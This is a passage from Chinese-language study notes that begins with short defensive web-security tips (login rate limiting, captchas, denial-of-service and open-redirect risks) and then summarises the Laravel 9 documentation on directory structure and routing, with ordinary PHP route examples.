例如 用户登陆 使用ip/用户名限制单位时间内登陆次数 必要时增加多次失败锁定限制 (可以用例如memcache redis等缓存机制 记录次数 限制频率)配合验证码进行限制 防止账号密码爆破
</p>

<p>
用户回复 发表文章 订阅关注功能 发起订单 等，也应增加频率和次数限制，防止大量填充垃圾信息，频率过高时增加验证码校验
</p>

<p>
邮箱/短信验证码 加上单日次数及频率限制 必要时增加验证码校验
</p>
</div>
<div id="outline-container-h:4180443e-2440-416a-856f-d38d79c96095" class="outline-4">
<h4 id="h:4180443e-2440-416a-856f-d38d79c96095">安全分享</h4>
<div class="outline-text-4" id="text-h:4180443e-2440-416a-856f-d38d79c96095">
<p>
代码审计是否容易审计越权漏洞？
正常来说查看有没有权限校验是比较容易的，它是有明确的代码的。难的是要不要做权限判断，因为看代码时不知道业务逻辑。
</p>
</div>
</div>
</div>
<div id="outline-container-h:93f25464-e5e4-4c81-9648-77258981f9dd" class="outline-3">
<h3 id="h:93f25464-e5e4-4c81-9648-77258981f9dd">拒绝服务</h3>
<div class="outline-text-3" id="text-h:93f25464-e5e4-4c81-9648-77258981f9dd">
<p>
通过特殊的用户输入 消耗的服务器资源 比如生成图片不限宽高(二维码 验证码 图片处理)
URL跳转
跳转到网站外第三方链接，可用于钓鱼，如果存在head注入则可以构成xss
</p>
</div>
</div>
</section>
<section id="outline-container-h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f" class="outline-2">
<h2 id="h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f">PHP 框架</h2>
<div class="outline-text-2" id="text-h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f">
</div>
<div id="outline-container-h:3398dd78-1297-43d9-8e95-af7a061e1424" class="outline-3">
<h3 id="h:3398dd78-1297-43d9-8e95-af7a061e1424">Laravel</h3>
<div class="outline-text-3" id="text-h:3398dd78-1297-43d9-8e95-af7a061e1424">
</div>
</div>
<div id="outline-container-h:bde611ec-55e2-4dfa-a451-714231ab3fdc" class="outline-3">
<h3 id="h:bde611ec-55e2-4dfa-a451-714231ab3fdc">介绍</h3>
<div class="outline-text-3" id="text-h:bde611ec-55e2-4dfa-a451-714231ab3fdc">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/structure#introduction">https://laravel.p2hp.com/cndocs/9.x/structure#introduction</a>
</p>

<p>
默认的 Laravel 应用程序结构旨在为大型和小型应用程序提供一个很好的起点。 但是您可以随意组织您的应用程序。 Laravel 对任何给定类的位置几乎没有任何限制——只要 Composer 可以自动加载该类。
</p>
</div>
</div>
<div id="outline-container-h:ef94d822-56d5-4dae-a819-0af09b994b71" class="outline-3">
<h3 id="h:ef94d822-56d5-4dae-a819-0af09b994b71">根目录</h3>
<div class="outline-text-3" id="text-h:ef94d822-56d5-4dae-a819-0af09b994b71">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/structure#the-root-directory">https://laravel.p2hp.com/cndocs/9.x/structure#the-root-directory</a>
</p>
</div>
<div id="outline-container-h:d8e7c3e7-0dda-4294-a165-f59eec0d0b13" class="outline-4">
<h4 id="h:d8e7c3e7-0dda-4294-a165-f59eec0d0b13">App 目录</h4>
<div class="outline-text-4" id="text-h:d8e7c3e7-0dda-4294-a165-f59eec0d0b13">
<p>
app 目录包含应用程序的核心代码。 我们将很快更详细地探索这个目录； 但是，您应用程序中的几乎所有类都将在此目录中。
</p>
</div>
</div>
<div id="outline-container-h:c1870069-bf33-4279-80ab-c9e437f8e7f3" class="outline-4">
<h4 id="h:c1870069-bf33-4279-80ab-c9e437f8e7f3">Bootstrap 目录</h4>
<div class="outline-text-4" id="text-h:c1870069-bf33-4279-80ab-c9e437f8e7f3">
<p>
bootstrap 目录包含启动框架的 app.php 文件。 该目录还包含一个“缓存”目录，其中包含用于性能优化的框架生成文件，例如路由和服务缓存文件。 您通常不需要修改此目录中的任何文件。
</p>
</div>
</div>
<div id="outline-container-h:dea68e60-a901-414a-83e0-4c40a046e70f" class="outline-4">
<h4 id="h:dea68e60-a901-414a-83e0-4c40a046e70f">Config 目录</h4>
<div class="outline-text-4" id="text-h:dea68e60-a901-414a-83e0-4c40a046e70f">
<p>
顾名思义， config 目录包含应用程序的所有配置文件。最好把这些文件都浏览一遍，并熟悉所有可用的选项。
</p>
</div>
</div>
<div id="outline-container-h:9584dad1-d811-4e91-8786-82a04ca7bc67" class="outline-4">
<h4 id="h:9584dad1-d811-4e91-8786-82a04ca7bc67">Database 目录</h4>
<div class="outline-text-4" id="text-h:9584dad1-d811-4e91-8786-82a04ca7bc67">
<p>
database 目录包含数据库迁移，模型工⼚和种子生成器文件。如果你愿意，你还可以把它作为 SQLite 数据库存放目录。
</p>
</div>
</div>
<div id="outline-container-h:9bcab003-e0ad-45f3-9127-e008edc4427a" class="outline-4">
<h4 id="h:9bcab003-e0ad-45f3-9127-e008edc4427a">Lang 目录</h4>
<div class="outline-text-4" id="text-h:9bcab003-e0ad-45f3-9127-e008edc4427a">
<p>
lang 目录包含应用程序的所有语言文件。
</p>
</div>
</div>
<div id="outline-container-h:ce3b05eb-6a10-40db-b32a-c0b03880c083" class="outline-4">
<h4 id="h:ce3b05eb-6a10-40db-b32a-c0b03880c083">Public 目录</h4>
<div class="outline-text-4" id="text-h:ce3b05eb-6a10-40db-b32a-c0b03880c083">
<p>
public 目录包含 index.php 文件，该文件是进入你应用程序的所有请求的入口，并配置自动加载。该目录还包含你的资源，如图像、JavaScript 脚本和 CSS 样式。
</p>
</div>
</div>
<div id="outline-container-h:b4f5c624-ac59-4ce4-8d28-5927ff2dfb0a" class="outline-4">
<h4 id="h:b4f5c624-ac59-4ce4-8d28-5927ff2dfb0a">Resources 目录</h4>
<div class="outline-text-4" id="text-h:b4f5c624-ac59-4ce4-8d28-5927ff2dfb0a">
<p>
resources 目录包含了 views 以及未编译的资源文件（如 CSS 或 JavaScript）。此目录还包含所有的语言文件。
</p>
</div>
</div>
<div id="outline-container-h:43ecc38f-318e-49cb-8adc-ce4d6dda5050" class="outline-4">
<h4 id="h:43ecc38f-318e-49cb-8adc-ce4d6dda5050">Routes 目录</h4>
<div class="outline-text-4" id="text-h:43ecc38f-318e-49cb-8adc-ce4d6dda5050">
<p>
routes 目录包含应用程序的所有路由定义。默认情况下，Laravel 包含几个路由文件：web.php ， api.php ， console.php 以及 channels.php .
</p>

<p>
web.php 文件包含 RouteServiceProvider 放置在 web 中间件组中的路由，该中间件组提供会话状态，CSRF保护和 cookie 加密，如果你的应用程序不提供无状态的 RESTful API，那么你的所有路由都很可能在 web.php 文件。
</p>

<p>
api.php 文件包含 RouteServiceProvider 放置在 api 中间件组中的路由。 这些路由旨在是无状态的，因此通过这些路由进入应用程序的请求旨在[通过令牌]（/cndocs/9.x/sanctum）进行身份验证，并且无法访问会话状态。
</p>

<p>
console.php 文件是您可以定义所有基于闭包的控制台命令的地方。 每个闭包都绑定到一个命令实例，允许一种简单的方法与每个命令的 IO 方法进行交互。 即使此文件没有定义 HTTP 路由，它也会定义应用程序中基于控制台的入口点（路由）。
</p>

<p>
channels.php 文件是您可以注册应用程序支持的所有 <a href="https://laravel.p2hp.com/cndocs/9.x/broadcasting">事件广播</a> 频道的地方。
</p>
</div>
</div>
<div id="outline-container-h:abf7af7f-9792-4d6e-a966-57785667f1dd" class="outline-4">
<h4 id="h:abf7af7f-9792-4d6e-a966-57785667f1dd">Storage 目录</h4>
<div class="outline-text-4" id="text-h:abf7af7f-9792-4d6e-a966-57785667f1dd">
<p>
storage 目录包含你的日志、编译的 Blade 模板、基于文件的会话、文件缓存和框架生成的其他文件。 该目录分为“app”、“framework”和“logs”目录。 app 目录可用于存储应用程序生成的任何文件。 framework 目录用于存储框架生成的文件和缓存。 最后， logs 目录包含应用程序的日志文件。
</p>

<p>
storage/app/public 目录可用于存储用户生成的文件，例如个人资料头像，这些文件应该可以公开访问。 你应该在 public/storage 创建一个指向这个目录的符号链接。 您可以使用 php artisan storage:link Artisan命令创建链接。
</p>
</div>
</div>
<div id="outline-container-h:887ffe9e-4bbe-4600-8437-d62c03fbbd04" class="outline-4">
<h4 id="h:887ffe9e-4bbe-4600-8437-d62c03fbbd04">Tests 目录</h4>
<div class="outline-text-4" id="text-h:887ffe9e-4bbe-4600-8437-d62c03fbbd04">
<p>
tests 目录包含您的自动化测试。 开箱即用的示例 <a href="https://phpunit.de/">PHPUnit</a> 单元测试和功能测试。 每个测试类都应以单词“Test”作为后缀。 您可以使用 phpunit 或 php vendor/bin/phpunit 命令运行测试。 或者，如果您想要更详细和更漂亮的测试结果表示，您可以使用 php artisan test Artisan 命令运行测试。
</p>
</div>
</div>
<div id="outline-container-h:aac91fab-d6cc-4ee1-a1d6-aab16972c6d4" class="outline-4">
<h4 id="h:aac91fab-d6cc-4ee1-a1d6-aab16972c6d4">Vendor 目录</h4>
<div class="outline-text-4" id="text-h:aac91fab-d6cc-4ee1-a1d6-aab16972c6d4">
<p>
vendor 目录包含您的 <a href="https://getcomposer.org/">Composer</a> 依赖项。
</p>
</div>
</div>
<div id="outline-container-h:4fa48dd4-57af-4584-8ccf-873d89f647dd" class="outline-4">
<h4 id="h:4fa48dd4-57af-4584-8ccf-873d89f647dd">注意</h4>
<div class="outline-text-4" id="text-h:4fa48dd4-57af-4584-8ccf-873d89f647dd">
<p>
请确保， Web 服务器将所有请求定向到项目目录的 public/index.php 文件。 不应该将 index.php 文件移动到项目的根目录，因为从项目根目录提供应用程序会将许多敏感配置文件暴露到公网
</p>
</div>
</div>
<div id="outline-container-h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8" class="outline-4">
<h4 id="h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8">入口</h4>
<div class="outline-text-4" id="text-h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8">
<p>
Laravel 应用程序的所有请求的入口点都是 public/index.php 文件。所有请求都由你的 web 服务器（Apache/Nginx）配置定向到此文件。那个 index.php 文件不包含太多代码。相反，它是加载框架其余部分的起点。
</p>

<p>
该 index.php 文件将加载 Composer 生成的自动加载器定义，然后从 bootstrap/app.php 中检索 Laravel应用程序的实例。 Laravel 本身采取的第一个操作是创建应用 / 服务容器 的实例。
</p>
</div>
</div>
</div>
<div id="outline-container-h:b9df02e7-a36d-46f6-9df6-65de1cacb190" class="outline-3">
<h3 id="h:b9df02e7-a36d-46f6-9df6-65de1cacb190">基本路由</h3>
<div class="outline-text-3" id="text-h:b9df02e7-a36d-46f6-9df6-65de1cacb190">
<p>
最基本的Laravel路由接受一个 URI 和一个闭包，提供了一个简单优雅的方法来定义路由和行为，而不需要复杂的路由配置文件:
</p>

<div class="org-src-container">
<pre class="src src-sh">use Illuminate\Support\Facades\Route;

Route::get(<span style="color: #8b2252;">'/greeting'</span>, <span style="color: #a020f0;">function</span> () {
  <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">'Hello World'</span>;
});
</pre>
</div>
</div>
<div id="outline-container-h:c0cb8938-e8aa-478f-b910-4be3d57ba879" class="outline-4">
<h4 id="h:c0cb8938-e8aa-478f-b910-4be3d57ba879">默认路由文件</h4>
<div class="outline-text-4" id="text-h:c0cb8938-e8aa-478f-b910-4be3d57ba879">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#the-default-route-files">https://laravel.p2hp.com/cndocs/9.x/routing#the-default-route-files</a>
</p>

<p>
所有Laravel路由都定义在你的路由文件中，它位于 routes 目录。这些文件会被你的应用程序中的 <code>App\Providers\RouteServiceProvider</code> 自动加载。 routes/web.php 文件用于定义 web 界面的路由。这些路由被分配给 web 中间件组, 它提供了 SESSION 状态和 CSRF 保护等功能。定义在 routes/api.php 中的路由都是无状态的，并且被分配了 api 中间件组。
</p>

<p>
对于大多数应用程序，都是以在 routes/web.php 文件定义路由开始的。可以通过在浏览器中输入定义的路由URL 来访问 routes/web.php 中定义的路由。例如，你可以在浏览器中输入 <a href="http://example.com/user">http://example.com/user</a> 来访问以下路由：
</p>

<div class="org-src-container">
<pre class="src src-sh">use App\Http\Controllers\UserController;

Route::get(<span style="color: #8b2252;">'/user'</span>, [UserController::class, <span style="color: #8b2252;">'index'</span>]);
</pre>
</div>

<p>
定义在 routes/api.php 文件中的路由是被 RouteServiceProvider 嵌套在一个路由组内。 在这个路由组内,将自动应用 /api URI 前缀，所以你无需手动将其应用于文件中的每个路由。你可以通过修改RouteServiceProvider 类来修改前缀和其他路由组选项。
</p>
</div>
</div>
<div id="outline-container-h:f94ec2c9-52a4-482d-9df5-4bf377b764f7" class="outline-4">
<h4 id="h:f94ec2c9-52a4-482d-9df5-4bf377b764f7">可用的路由方法</h4>
<div class="outline-text-4" id="text-h:f94ec2c9-52a4-482d-9df5-4bf377b764f7">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#available-router-methods">https://laravel.p2hp.com/cndocs/9.x/routing#available-router-methods</a>
</p>

<p>
路由器允许你注册能响应任何 HTTP 请求的路由：
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::get($<span style="color: #a0522d;">uri</span>, $<span style="color: #a0522d;">callback</span>);
Route::post($<span style="color: #a0522d;">uri</span>, $<span style="color: #a0522d;">callback</span>);
Route::put($<span style="color: #a0522d;">uri</span>, $<span style="color: #a0522d;">callback</span>);
Route::patch($<span style="color: #a0522d;">uri</span>, $<span style="color: #a0522d;">callback</span>);
Route::delete($<span style="color: #a0522d;">uri</span>, $<span style="color: #a0522d;">callback</span>);
Route::options($<span style="color: #a0522d;">uri</span>, $<span style="color: #a0522d;">callback</span>);
</pre>
</div>

<p>
有的时候你可能需要注册一个可响应多个 HTTP 请求的路由，这时你可以使用 match 方法，也可以使用 any 方法注册一个实现响应所有 HTTP 请求的路由：
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::match([<span style="color: #8b2252;">'get'</span>, <span style="color: #8b2252;">'post'</span>], <span style="color: #8b2252;">'/'</span>, <span style="color: #a020f0;">function</span> () {
//
});

Route::any(<span style="color: #8b2252;">'/'</span>, <span style="color: #a020f0;">function</span> () {
//
});
</pre>
</div>

<p>
技巧：当定义多个相同路由时，使用 get ， post ， put ， patch ， delete ， 和 options 方法的路由应该在使用 any ， match ， 和 redirect 方法的路由之定义，这样可以确保请求与正确的路由匹配。
</p>
</div>
</div>
<div id="outline-container-h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180" class="outline-4">
<h4 id="h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180">依赖注入</h4>
<div class="outline-text-4" id="text-h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#dependency-injection">https://laravel.p2hp.com/cndocs/9.x/routing#dependency-injection</a>
</p>

<p>
你可以在路由的回调方法中，以形参的方式声明路由所需要的任何依赖项。这些依赖会被 Laravel 的 容器 自动解析并注入。 例如, 你可以在闭包中声明 Illuminate\Http\Request 类，让当前的 HTTP 请求自动注入依赖到您的路由回调中：
</p>

<div class="org-src-container">
<pre class="src src-sh">use Illuminate\Http\Request;

Route::get(<span style="color: #8b2252;">'/users'</span>, <span style="color: #a020f0;">function</span> (Request $<span style="color: #a0522d;">request</span>) {
// ...
});
</pre>
</div>
</div>
</div>
<div id="outline-container-h:83c07513-01a8-4fe3-adc6-1a86f29128d1" class="outline-4">
<h4 id="h:83c07513-01a8-4fe3-adc6-1a86f29128d1">CSRF 保护</h4>
<div class="outline-text-4" id="text-h:83c07513-01a8-4fe3-adc6-1a86f29128d1">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#csrf-protection">https://laravel.p2hp.com/cndocs/9.x/routing#csrf-protection</a>
</p>

<p>
请记住，指向 POST 、 PUT 、 PATCH 、 或 DELETE 路由的任何 HTML 表单都应该包含一个 CSRF 令牌字段，否则，这个请求将会被拒绝。可以在 CSRF 文档 中阅读有关 CSRF 更多的信息:
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;form <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"POST"</span> <span style="color: #a0522d;">action</span>=<span style="color: #8b2252;">"/profile"</span>&gt;
  @csrf
   ...
&lt;/form&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ce8dc675-ad7d-4382-9d87-0baabb460806" class="outline-4">
<h4 id="h:ce8dc675-ad7d-4382-9d87-0baabb460806">重定向路由</h4>
<div class="outline-text-4" id="text-h:ce8dc675-ad7d-4382-9d87-0baabb460806">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#redirect-routes">https://laravel.p2hp.com/cndocs/9.x/routing#redirect-routes</a>
</p>

<p>
如果要定义重定向到另一个 URI 的路由，可以使用 Route::redirect 方法。这个方法可以快速的实现重定向，而不再需要去定义完整的路由或者控制器:
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::redirect(<span style="color: #8b2252;">'/here'</span>, <span style="color: #8b2252;">'/there'</span>);
</pre>
</div>

<p>
默认情况下， Route::redirect 返回 302 状态码。你可以使用可选的第三个参数来定制状态码:
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::redirect(<span style="color: #8b2252;">'/here'</span>, <span style="color: #8b2252;">'/there'</span>, 301);
</pre>
</div>

<p>
或者，你可以使用 Route::permanentRedirect 方法返回 301 状态码:
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::permanentRedirect(<span style="color: #8b2252;">'/here'</span>, <span style="color: #8b2252;">'/there'</span>);
</pre>
</div>

<p>
注意：在重定向路由中使用路由参数时，以下参数由 Laravel 保留，不能使用： destination 和 status
</p>
</div>
</div>
<div id="outline-container-h:f73bb9b6-9d51-4c6c-b766-c1842da26de0" class="outline-4">
<h4 id="h:f73bb9b6-9d51-4c6c-b766-c1842da26de0">视图路由</h4>
<div class="outline-text-4" id="text-h:f73bb9b6-9d51-4c6c-b766-c1842da26de0">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#view-routes">https://laravel.p2hp.com/cndocs/9.x/routing#view-routes</a>
</p>

<p>
如果你的路由只需要返回一个 视图，可以使用 Route::view 方法。它和 redirect 一样方便，不需要定义完整的路由或控制器。 view 方法有三个参数，其中前两个是必填参数，分别是 URI 和视图名称。第三个参数选填，可以传入一个数组，数组中的数据会被传递给视图:
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::view(<span style="color: #8b2252;">'/welcome'</span>, <span style="color: #8b2252;">'welcome'</span>);

Route::view(<span style="color: #8b2252;">'/welcome'</span>, <span style="color: #8b2252;">'welcome'</span>, [<span style="color: #8b2252;">'name'</span> =&gt; <span style="color: #8b2252;">'Taylor'</span>]);
</pre>
</div>

<p>
注意：当在图路由使用路线参数，下面的参数是由 Laravel 保留，不能使用： view ， data ， status ， 和 headers
</p>
</div>
</div>
</div>
<div id="outline-container-h:f6e2e169-833f-49b8-a4a9-de3d189b96a3" class="outline-3">
<h3 id="h:f6e2e169-833f-49b8-a4a9-de3d189b96a3">路由参数</h3>
<div class="outline-text-3" id="text-h:f6e2e169-833f-49b8-a4a9-de3d189b96a3">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-parameters">https://laravel.p2hp.com/cndocs/9.x/routing#route-parameters</a>
</p>
</div>
<div id="outline-container-h:045cfae3-b935-43b6-8e06-1bdcfdc0a591" class="outline-4">
<h4 id="h:045cfae3-b935-43b6-8e06-1bdcfdc0a591">必填参数</h4>
<div class="outline-text-4" id="text-h:045cfae3-b935-43b6-8e06-1bdcfdc0a591">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#required-parameters">https://laravel.p2hp.com/cndocs/9.x/routing#required-parameters</a>
</p>

<p>
有时您将需要捕获路由内的 URI 段。例如，您可能需要从 URL 中捕获用户的 ID。您可以通过定义路由参数来做到这一点：
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/user/{id}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">id</span>) {
<span style="color: #a020f0;">return</span> <span style="color: #8b2252;">'User '</span>.$<span style="color: #a0522d;">id</span>;
});
</pre>
</div>

<p>
也可以根据您的需要在路由中定义多个参数：
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/posts/{post}/comments/{comment}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">postId</span>, $<span style="color: #a0522d;">commentId</span>) {
//
});
</pre>
</div>

<p>
路由的参数通常都会被放在 {} ，并且参数名只能为字母。 下划线 ( _ ) 也可以用于路由参数名中。路由参数会按路由定义的顺序依次注入到路由回调或者控制器中 - ，而不受回调或者控制器的参数名称的影响。
</p>
</div>
<div id="outline-container-h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb" class="outline-5">
<h5 id="h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb">参数和依赖注入</h5>
<div class="outline-text-5" id="text-h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#parameters-and-dependency-injection">https://laravel.p2hp.com/cndocs/9.x/routing#parameters-and-dependency-injection</a>
</p>

<p>
如果您的路由具有依赖关系，而您希望 Laravel 服务容器自动注入到路由的回调中，则应在依赖关系之后列出路由参数：
</p>

<div class="org-src-container">
<pre class="src src-sh">use Illuminate\Http\Request;

Route::get(<span style="color: #8b2252;">'/user/{id}'</span>, <span style="color: #a020f0;">function</span> (Request $<span style="color: #a0522d;">request</span>, $<span style="color: #a0522d;">id</span>) {
<span style="color: #a020f0;">return</span> <span style="color: #8b2252;">'User '</span>.$<span style="color: #a0522d;">id</span>;
});
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:48b1497a-5027-406c-aae6-aacd08820e12" class="outline-4">
<h4 id="h:48b1497a-5027-406c-aae6-aacd08820e12">可选参数</h4>
<div class="outline-text-4" id="text-h:48b1497a-5027-406c-aae6-aacd08820e12">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#parameters-optional-parameters">https://laravel.p2hp.com/cndocs/9.x/routing#parameters-optional-parameters</a>
</p>

<p>
有时，你可能需要指定一个路由参数，但你希望这个参数是可选的。你可以在参数后面加上 ? 标记来实现，但前提是要确保路由的相应变量有默认值：
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/user/{name?}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">name</span> = null) {
  <span style="color: #a020f0;">return</span> $<span style="color: #a0522d;">name</span>;
});

Route::get(<span style="color: #8b2252;">'/user/{name?}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">'John'</span>) {
  <span style="color: #a020f0;">return</span> $<span style="color: #a0522d;">name</span>;
});
</pre>
</div>
</div>
</div>
<div id="outline-container-h:a70c96fc-314f-421d-9bea-bbc47e66a8a9" class="outline-4">
<h4 id="h:a70c96fc-314f-421d-9bea-bbc47e66a8a9">正则表达式约束</h4>
<div class="outline-text-4" id="text-h:a70c96fc-314f-421d-9bea-bbc47e66a8a9">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#parameters-regular-expression-constraints">https://laravel.p2hp.com/cndocs/9.x/routing#parameters-regular-expression-constraints</a>
</p>

<p>
您可以使用路由实例上的 where 方法来限制路由参数的格式。 where 方法接受参数的名称和定义如何约束参数的正则表达式：
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/user/{name}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">name</span>) {
//
})-&gt;where(<span style="color: #8b2252;">'name'</span>, <span style="color: #8b2252;">'[A-Za-z]+'</span>);

Route::get(<span style="color: #8b2252;">'/user/{id}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">id</span>) {
//
})-&gt;where(<span style="color: #8b2252;">'id'</span>, <span style="color: #8b2252;">'[0-9]+'</span>);

Route::get(<span style="color: #8b2252;">'/user/{id}/{name}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">id</span>, $<span style="color: #a0522d;">name</span>) {
//
})-&gt;where([<span style="color: #8b2252;">'id'</span> =&gt; <span style="color: #8b2252;">'[0-9]+'</span>, <span style="color: #8b2252;">'name'</span> =&gt; <span style="color: #8b2252;">'[a-z]+'</span>]);
</pre>
</div>

<p>
为方便起见，一些常用的正则表达式模式具有帮助方法，可让您快速将模式约束添加到路由：
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/user/{id}/{name}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">id</span>, $<span style="color: #a0522d;">name</span>) {
//
})-&gt;whereNumber(<span style="color: #8b2252;">'id'</span>)-&gt;whereAlpha(<span style="color: #8b2252;">'name'</span>);

Route::get(<span style="color: #8b2252;">'/user/{name}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">name</span>) {
//
})-&gt;whereAlphaNumeric(<span style="color: #8b2252;">'name'</span>);

Route::get(<span style="color: #8b2252;">'/user/{id}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">id</span>) {
//
})-&gt;whereUuid(<span style="color: #8b2252;">'id'</span>);
</pre>
</div>

<p>
如果传入的请求与路由模式约束不匹配，将返回 404 HTTP 响应。
</p>
</div>
<div id="outline-container-h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9" class="outline-5">
<h5 id="h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9">全局约束</h5>
<div class="outline-text-5" id="text-h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#parameters-global-constraints">https://laravel.p2hp.com/cndocs/9.x/routing#parameters-global-constraints</a>
</p>

<p>
如果您希望路由参数始终受给定正则表达式的约束，您可以使用 pattern 方法。 您应该在App\Providers\RouteServiceProvider 类的 boot 方法中定义这些模式：
</p>

<div class="org-src-container">
<pre class="src src-sh">/**
* &#23450;&#20041;&#36335;&#30001;&#27169;&#22411;&#32465;&#23450;&#12289;&#27169;&#24335;&#36807;&#28388;&#22120;&#31561;&#12290;
*
* @return void
*/
public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">boot</span>()
{
Route::pattern(<span style="color: #8b2252;">'id'</span>, <span style="color: #8b2252;">'[0-9]+'</span>);
}
</pre>
</div>

<p>
一旦定义了模式，它就会自动应用到使用该参数名称的所有路由：
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/user/{id}'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">id</span>) {
  // &#20165;&#24403;{id}&#26159;&#25968;&#23383;&#26102;&#25191;&#34892;&#12290;&#12290;&#12290;
});
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:db1d62da-059e-4c15-86f2-c43582ad87c7" class="outline-3">
<h3 id="h:db1d62da-059e-4c15-86f2-c43582ad87c7">命名路由</h3>
<div class="outline-text-3" id="text-h:db1d62da-059e-4c15-86f2-c43582ad87c7">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#named-routes">https://laravel.p2hp.com/cndocs/9.x/routing#named-routes</a>
</p>

<p>
命名路由允许为特定路由方便地生成URL或重定向。通过将 name 方法链接到路由定义上，可以指定路由的名称：
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/user/profile'</span>, <span style="color: #a020f0;">function</span> () {
//
})-&gt;name(<span style="color: #8b2252;">'profile'</span>);
</pre>
</div>

<p>
您还可以为控制器操作指定路由名称：
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::get(
<span style="color: #8b2252;">'/user/profile'</span>,
 [UserProfileController::class, <span style="color: #8b2252;">'show'</span>] )-&gt;name(<span style="color: #8b2252;">'profile'</span>);
</pre>
</div>

<p>
注意：路由名称应始终是唯一的。
</p>
</div>
<div id="outline-container-h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1" class="outline-4">
<h4 id="h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1">生成命名路由的 URL</h4>
<div class="outline-text-4" id="text-h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1">
<p>
<a href="https://laravel.p2hp.com/cndocs/9.x/routing#generating-urls-to-named-routes">https://laravel.p2hp.com/cndocs/9.x/routing#generating-urls-to-named-routes</a>
</p>

<p>
一旦你为给定的路由分配了一个名字，你可以在通过 Laravel 的 route 和 redirect 辅助函数生成 URL 或重定向时使用该路由的名称：
</p>

<div class="org-src-container">
<pre class="src src-sh">// &#27491;&#22312;&#29983;&#25104; URL...
$<span style="color: #a0522d;">url</span> = route(<span style="color: #8b2252;">'profile'</span>);

// &#27491;&#22312;&#29983;&#25104;&#37325;&#23450;&#21521;...
<span style="color: #a020f0;">return</span> redirect()-&gt;route(<span style="color: #8b2252;">'profile'</span>);
</pre>
</div>

<p>
如果命名路由定义了参数，您可以将参数作为第二个参数传递给 route 函数。 给定的参数将自动插入到生成的URL 的正确位置：
</p>

<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/user/{id}/profile'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">id</span>) {
//
})-&gt;name(<span style="color: #8b2252;">'profile'</span>);
$<span style="color: #a0522d;">url</span> = route(<span style="color: #8b2252;">'profile'</span>, [<span style="color: #8b2252;">'id'</span> =&gt; 1]);
</pre>
</div>

<p>
如果您在数组中传递其他参数，这些键/值对将自动添加到生成的 URL 的查询字符串中：
</p>
<div class="org-src-container">
<pre class="src src-sh">Route::get(<span style="color: #8b2252;">'/user/{id}/profile'</span>, <span style="color: #a020f0;">function</span> ($<span style="color: #a0522d;">id</span>) {
//
})-&gt;name(<span style="color: #8b2252;">'profile'</span>);

